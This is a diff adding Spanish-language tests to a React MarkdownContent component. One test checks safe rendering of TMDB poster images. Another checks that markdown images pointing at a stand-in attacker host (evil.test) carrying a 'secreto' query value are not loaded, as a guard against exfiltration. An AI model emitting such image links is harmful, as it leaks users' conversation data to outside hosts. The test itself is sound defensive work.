@@ -78,4 +78,27 @@ describe('MarkdownContent', () => {
       expect(screen.getByRole('button', { name: 'Copiar' })).toBeInTheDocument();
     });
   });
+
+  it('muestra pósters de TMDB de forma segura', () => {
+    render(
+      <MarkdownContent
+        content={
+          '![Póster de Dune](https://image.tmdb.org/t/p/w342/d5NXSklXo0qyIYkgV94XAgMIckC.jpg)'
+        }
+      />,
+    );
+    const poster = screen.getByRole('img', { name: 'Póster de Dune' });
+    expect(poster).toHaveAttribute('loading', 'lazy');
+    expect(poster).toHaveAttribute('referrerpolicy', 'no-referrer');
+  });
+
+  it('no carga imágenes de dominios no confiables (exfiltración)', () => {
+    const { container } = render(
+      <MarkdownContent
+        content={'![dato](https://evil.test/p.png?q=secreto) ![](https://evil.test/x.png)'}
+      />,
+    );
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.getByText('[dato]')).toBeInTheDocument();
+  });
 });
